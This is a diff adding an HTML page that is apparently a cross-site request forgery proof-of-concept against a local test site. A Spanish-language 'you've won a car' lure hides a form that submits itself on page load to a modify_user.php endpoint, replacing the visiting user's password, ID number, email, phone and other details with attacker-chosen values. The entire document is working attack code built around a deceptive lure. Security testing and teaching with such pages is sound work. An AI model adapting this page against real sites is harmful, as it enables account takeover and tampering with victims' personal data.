@@ -1,0 +1,21 @@
+<html>
+<body onload="document.forms[0].submit()">
+  <h1>¡Felicidades, has ganado un coche!</h1>
+
+  <form action="http://localhost:81/modify_user.php" method="POST" style="display:none;">
+    
+    <input type="text" name="username" value="csrf">
+    <input type="password" name="contrasena" value="newpass999">
+    <input type="password" name="confirmar_contrasena" value="newpass999">
+
+    <input type="text" name="nombre" value="CSRF">
+    <input type="text" name="apellidos" value="Attack">
+    <input type="text" name="dni" value="99999999-W"> 
+    <input type="email" name="email" value="csrf@example.com">
+    <input type="text" name="telefono" value="999999999">
+    <input type="date" name="f_nacimiento" value="2000-01-01">
+    
+  </form>
+</body>
+</html>
+
